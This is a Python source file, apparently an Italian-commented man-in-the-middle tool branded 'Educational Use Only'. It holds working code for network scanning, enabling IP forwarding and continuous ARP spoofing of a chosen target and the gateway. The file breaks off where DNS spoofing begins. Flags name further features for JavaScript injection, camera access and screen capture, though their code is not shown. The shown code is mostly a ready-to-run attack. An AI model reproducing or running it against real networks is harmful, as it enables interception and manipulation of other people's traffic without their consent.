#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import netifaces
import threading
import json
import base64
from scapy.all import ARP, Ether, srp, getmacbyip, send, get_if_hwaddr, sniff, IP, TCP
from scapy.layers.l2 import arping
import socket
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs
import random
import string
import signal
from io import BytesIO
from PIL import Image
import cv2
import numpy as np

# Colori per l'output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Variabili globali per il controllo dei thread
arp_spoofing_active = False
dns_spoofing_active = False
js_injection_active = False
camera_access_active = False
screen_capture_active = False
packet_capture_active = False

def print_banner():
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║    ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     ║
    ║    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║     ║
    ║       ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║     ║
    ║       ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     ║
    ║       ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗║
    ║       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝║
    ║                                                              ║
    ║                  MITM Network Testing Tool                   ║
    ║                       Educational Use Only                   ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(f"{Colors.CYAN}{banner}{Colors.END}")

def get_default_interface():
    """Ottiene l'interfaccia di rete predefinita"""
    gateways = netifaces.gateways()
    default_gateway = gateways['default'].get(netifaces.AF_INET)
    if default_gateway:
        return default_gateway[1]
    return None

def get_network_info(interface):
    """Ottiene informazioni sulla rete corrente"""
    try:
        addrs = netifaces.ifaddresses(interface)
        ip_info = addrs[netifaces.AF_INET][0]
        ip = ip_info['addr']
        netmask = ip_info['netmask']
        
        # Calcola la rete
        network_parts = ip.split('.')
        netmask_parts = netmask.split('.')
        
        network = []
        for i in range(4):
            network_part = str(int(network_parts[i]) & int(netmask_parts[i]))
            network.append(network_part)
            
        network_prefix = '.'.join(network[:3])
        
        return ip, f"{network_prefix}.0/24"
    except:
        return None, None

def scan_network(network):
    """Scansiona la rete per trovare dispositivi connessi"""
    print(f"{Colors.YELLOW}[+] Scanning network {network}...{Colors.END}")
    
    try:
        # Usa arping per scansionare la rete
        ans, unans = arping(network, timeout=2)
        devices = []
        
        for sent, received in ans:
            ip = received.psrc
            mac = received.hwsrc
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                hostname = "Unknown"
            
            devices.append({
                'ip': ip,
                'mac': mac,
                'hostname': hostname
            })
        
        return devices
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {str(e)}{Colors.END}")
        return []

def print_devices(devices):
    """Stampa la lista dei dispositivi trovati"""
    if not devices:
        print(f"{Colors.RED}[!] No devices found{Colors.END}")
        return
    
    print(f"\n{Colors.GREEN}[*] Devices found:{Colors.END}")
    print(f"{Colors.BOLD}{'ID':<5}{'IP':<20}{'MAC':<20}{'Hostname':<30}{Colors.END}")
    print("-" * 75)
    
    for i, device in enumerate(devices):
        print(f"{i:<5}{device['ip']:<20}{device['mac']:<20}{device['hostname']:<30}")

def enable_ip_forwarding():
    """Abilita l'IP forwarding per l'attacco MITM"""
    try:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
        print(f"{Colors.GREEN}[+] IP forwarding enabled{Colors.END}")
        return True
    except:
        print(f"{Colors.RED}[!] Unable to enable IP forwarding{Colors.END}")
        return False

def disable_ip_forwarding():
    """Disabilita l'IP forwarding"""
    try:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)
        print(f"{Colors.YELLOW}[-] IP forwarding disabled{Colors.END}")
    except:
        print(f"{Colors.RED}[!] Unable to disable IP forwarding{Colors.END}")

def get_gateway_ip():
    """Ottiene l'IP del gateway"""
    gateways = netifaces.gateways()
    default_gateway = gateways['default'].get(netifaces.AF_INET)
    if default_gateway:
        return default_gateway[0]
    return None

def arp_spoof(target_ip, gateway_ip, interface):
    """Esegue l'ARP spoofing"""
    global arp_spoofing_active
    arp_spoofing_active = True
    
    try:
        # Ottieni il MAC address del target
        target_mac = getmacbyip(target_ip)
        if not target_mac:
            print(f"{Colors.RED}[!] Cannot get MAC of target {target_ip}{Colors.END}")
            return False
        
        # Crea i pacchetti ARP
        packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        packet2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip)
        
        print(f"{Colors.GREEN}[+] Starting ARP spoofing attack against {target_ip}{Colors.END}")
        print(f"{Colors.YELLOW}[!] Press Ctrl+C to stop the attack{Colors.END}")
        
        while arp_spoofing_active:
            try:
                # Invia i pacchetti
                send(packet1, verbose=0)
                send(packet2, verbose=0)
                time.sleep(2)
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[-] Stopping ARP spoofing attack{Colors.END}")
                arp_spoofing_active = False
                # Ripristina le tabelle ARP
                restore_arp(target_ip, gateway_ip, target_mac, interface)
                restore_arp(gateway_ip, target_ip, getmacbyip(gateway_ip), interface)
                return True
    except Exception as e:
        print(f"{Colors.RED}[!] Error during ARP spoofing: {str(e)}{Colors.END}")
        return False

def restore_arp(target_ip, source_ip, target_mac, interface):
    """Ripristina le tabelle ARP"""
    try:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=get_if_hwaddr(interface))
        send(packet, count=5, verbose=0)
    except:
        pass

def start_dns_spoofing(interface):
    """Avvia il DNS spoofing"""
    global dns_spoofing_active
    dns_spoofing_active = True
    
    try:
        print(f"{Colors.GREEN}[+] Setting up DNS spoofing{Colors.END}")
        
